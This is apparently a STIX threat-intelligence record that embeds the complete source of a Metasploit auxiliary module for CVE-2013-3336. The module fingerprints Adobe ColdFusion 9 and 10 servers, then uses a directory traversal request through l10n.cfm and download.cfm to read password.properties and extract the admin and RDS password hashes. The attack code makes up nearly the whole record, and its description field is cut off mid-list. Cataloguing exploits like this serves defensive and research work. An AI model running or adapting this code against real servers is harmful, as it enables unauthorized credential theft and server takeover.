{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--863c3ae2-c681-4405-a414-8c57616e5513",
    "created": "2024-08-14T16:32:31.739848Z",
    "modified": "2024-08-14T16:32:31.739851Z",
    "name": "\"ColdFusion password.properties Hash Extraction\"",
    "description": " This module uses a directory traversal vulnerability to extract information such as password, rdspassword, and \"encrypted\" properties. This module has been tested successfully on ColdFusion 9 and ColdFusion 10 (auto-detect).  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/coldfusion_pwd_props.rb",
            "external_id": "coldfusion_pwd_props.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"ColdFusion 'password.properties' Hash Extraction\",\n      'Description'    => %q{\n          This module uses a directory traversal vulnerability to extract information\n        such as password, rdspassword, and \"encrypted\" properties. This module has been\n        tested successfully on ColdFusion 9 and ColdFusion 10 (auto-detect).\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2013-3336' ],\n          [ 'OSVDB', '93114' ],\n          [ 'EDB', '25305' ]\n        ],\n      'Author'         =>\n        [\n          'HTP',\n          'sinn3r',\n          'nebulus'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-05-07'  #The day we saw the subzero poc\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new(\"TARGETURI\", [true, 'Base path to ColdFusion', '/'])\n      ])\n  end\n\n  def fingerprint(response)\n\n    if(response.headers.has_key?('Server') )\n      if(response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\\(Windows/)\n        os = \"Windows (#{response.headers['Server']})\"\n      elsif(response.headers['Server'] =~ /Apache\\//)\n          os = \"Unix (#{response.headers['Server']})\"\n      else\n        os = response.headers['Server']\n      end\n    end\n\n    return nil if response.body.length < 100\n\n    title = \"Not Found\"\n    response.body.gsub!(/[\\r\\n]/, '')\n    if(response.body =~ /<title.*\\/?>(.+)<\\/title\\/?>/i)\n      title = $1\n      title.gsub!(/\\s/, '')\n    end\n    return nil  if( title == 'Not Found' or not title =~ /ColdFusionAdministrator/)\n\n    out = nil\n\n    if(response.body =~ />\\s*Version:\\s*(.*)<\\/strong\\><br\\s\\//)\n      v = $1\n      out = (v =~ /^6/) ? \"Adobe ColdFusion MX6 (Not Vulnerable)\" : \"Adobe ColdFusion MX7 (Not Vulnerable)\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/ )\n      out = \"Adobe ColdFusion MX7 (Not Vulnerable)\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995-2006 Adobe/)\n      out = \"Adobe ColdFusion 8 (Not Vulnerable)\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995\\-2010 Adobe/ and\n      response.body =~ /1997\\-2012 Adobe Systems Incorporated and its licensors/)\n      out = \"Adobe ColdFusion 10\"\n    elsif(response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995-2010 Adobe/ or\n      response.body =~ /<meta name=\\\"Author\\\" content=\\\"Copyright \\(c\\) 1995\\-2009 Adobe Systems\\, Inc\\. All rights reserved/)\n      out = \"Adobe ColdFusion 9\"\n    elsif(response.body =~ /<meta name=\\\"Keywords\\\" content=\\\"(.*)\\\">\\s+<meta name/)\n      out = $1.split(/,/)[0]\n    else\n      out = 'Unknown ColdFusion'\n    end\n\n    if(title.downcase == 'coldfusionadministrator')\n      out << \" (you have administrator access)\"\n    end\n\n    out << \" (#{os})\"\n    file = ''\n    trav = ''\n    if(os =~ /Windows/ )\n      trav = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..'\n      file = (out =~ /ColdFusion 9/) ? '\\ColdFusion9\\lib\\password.properties' : '\\ColdFusion10\\CFusion\\lib\\password.properties'\n    else\n      trav = '../../../../../../../../../..'\n      file = (out =~ /ColdFusion 9/) ? '/opt/coldfusion9/lib/password.properties' : '/opt/coldfusion10/cfusion/lib/password.properties'\n    end\n\n    if(response.body =~ /Adobe/ and response.body =~ /ColdFusion/ and file == '')\n      print_error(\"#{peer} Fingerprint failed...aborting\")\n      print_status(\"response: #{response.body}\")\n      return nil,nil\n    end\n\n    return out,\"#{trav}#{file}\"\n  end\n\n  def check\n    if check_cf\n      return Msf::Exploit::CheckCode::Vulnerable\n    end\n\n    Msf::Exploit::CheckCode::Safe\n  end\n\n  def check_cf\n    vuln = false\n    url = '/CFIDE/adminapi/customtags/l10n.cfm'\n    res = send_request_cgi({\n        'uri' => url,\n        'method' => 'GET',\n        'Connection' => \"keep-alive\",\n        'Accept-Encoding' => \"zip,deflate\",\n        })\n\n    if(res != nil)\n    # can't stack b/c res.code won't exist if res is nil\n      vuln = true if(res.code == 500 and res.body =~ /attributes\\.id was not provided/)\n    end\n\n    if(vuln)\n      url = '/CFIDE/administrator/mail/download.cfm'\n      res = send_request_cgi({\n          'uri' => url,\n          'method' => 'GET',\n          'Connection' => \"keep-alive\",\n          'Accept-Encoding' => \"zip,deflate\",\n          })\n      if(res != nil)\n        vuln = false if (res.code != 200)\n      end\n    end\n\n    return vuln\n  end\n\n\n  def run\n    filename = \"\"\n\n    url = '/CFIDE/administrator/index.cfm'\n    # print_status(\"Getting index...\")\n    res = send_request_cgi({\n        'uri' => url,\n        'method' => 'GET',\n        'Connection' => \"keep-alive\",\n        'Accept-Encoding' => \"zip,deflate\",\n        })\n    # print_status(\"Got back: #{res.inspect}\")\n    return if not res\n    return if not res.body or not res.code\n    return if not res.code.to_i == 200\n\n    out, filename = fingerprint(res)\n    print_status(\"#{peer} #{out}\") if out\n\n    if(out =~ /Not Vulnerable/)\n      print_status(\"#{peer} isn't vulnerable to this attack\")\n      return\n    end\n\n    if(not check_cf)\n      print_status(\"#{peer} can't be exploited (either files missing or permissions block access)\")\n      return\n    end\n\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),\n      'encode_params' => false,\n      'encode' => false,\n      'vars_get' => {\n        'attributes.id'            => 'it',\n        'attributes.file'          => '../../administrator/mail/download.cfm',\n        'filename'                 => filename,\n        'attributes.locale'        => 'it',\n        'attributes.var'           => 'it',\n        'attributes.jscript'       => 'false',\n        'attributes.type'          => 'text/html',\n        'attributes.charset'       => 'UTF-8',\n        'thisTag.executionmode'    => 'end',\n        'thisTag.generatedContent' => 'htp'\n      }\n    })\n\n    if res.nil?\n      print_error(\"Unable to receive a response\")\n      return\n    end\n\n    rdspass   = res.body.scan(/^rdspassword=(.+)/).flatten[0] || ''\n    password  = res.body.scan(/^password=(.+)/).flatten[0]    || ''\n    encrypted = res.body.scan(/^encrypted=(.+)/).flatten[0]   || ''\n\n    if rdspass.empty? and password.empty?\n      # No pass collected, no point to store anything\n      print_error(\"No passwords found\")\n      return\n    end\n\n    print_good(\"rdspassword = #{rdspass}\")\n    print_good(\"password    = #{password}\")\n    print_good(\"encrypted   = #{encrypted}\")\n\n    p = store_loot('coldfusion.password.properties', 'text/plain', rhost, res.body)\n    print_good(\"password.properties stored in '#{p}'\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-05-07  #The day we saw the subzero poc"
}